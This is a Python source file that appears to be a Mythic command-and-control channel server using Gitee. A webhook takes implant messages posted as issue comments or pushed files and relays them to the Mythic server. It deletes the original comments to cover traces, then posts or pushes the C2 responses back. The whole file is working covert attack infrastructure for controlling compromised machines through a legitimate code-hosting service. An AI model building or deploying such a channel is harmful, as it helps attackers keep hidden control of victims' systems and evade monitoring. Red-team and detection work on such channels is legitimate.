#!/usr/local/bin/python
import asyncio
import gitee_client as gitee_client
import hashlib
import hmac
import json
import logging
import mythic_client as mythic_client
import mythic_container
import os
import sys
from config import config
from mythic_container.logging import logger
from quart import Quart, request, jsonify

app = Quart(__name__)
log = logging.getLogger("quart.app")
log.setLevel(logging.INFO)


def verify_signature(payload, signature, secret):
    mac = hmac.new(secret.encode(), msg=payload, digestmod=hashlib.sha256)
    return hmac.compare_digest("sha256=" + mac.hexdigest(), signature)

@app.route("/", methods=["POST"])
async def webhook():
    gitee_token = request.headers.get("X-Gitee-Token")
    signature = request.headers.get("X-Hub-Signature-256")

    if gitee_token:
        if gitee_token != config.get("webhook_secret"):
            return jsonify({"error": "Invalid token"}), 400
    else:
        if signature is None:
            log.info("Basic web request with no signature or token")
            return jsonify({"error": "Missing signature"}), 400
        if not verify_signature(await request.data, signature, config["webhook_secret"]):
            return jsonify({"error": "Invalid signature"}), 400

    event =  request.headers.get("X-Gitee-Event")
    payload = await request.json

    if event == "issue_comment":
        action = payload.get("action")
        issue = payload.get("issue", {})
        comment = payload.get("comment", {})

        if action == "created" and issue.get("number") == config.get("client_issue"):
            log.info(comment.get("body"))
            resp = await mythic_client.send_to_mythic(comment.get("body"))
            await gitee_client.delete_comment(comment.get("id"))
            await gitee_client.post_comment(resp)

    elif event == "push":
        commit = payload.get("head_commit") or (payload.get("commits") or [None])[-1]
        if commit:
            added = commit.get("added") or []
            if "server.txt" in added:
                uuid = commit.get("message")
                myth_msg = await gitee_client.read_file(uuid)
                myth_resp = await mythic_client.send_to_mythic(myth_msg)
                await gitee_client.push(uuid, myth_resp)

    return jsonify({"status": "success"}), 200

async def main():
    global config
    log.info("Loading configuration")
    with open("config.json", "rb") as config_file:
        config.update(json.loads(config_file.read().decode("utf-8")))
    config["mythic_address"] = os.environ["MYTHIC_ADDRESS"]
    sys.stdout.flush()

    log.info(f"Starting web server at 0.0.0.0:{config['port']}")
    await app.run_task(host="0.0.0.0", port=config["port"])


asyncio.run(main())
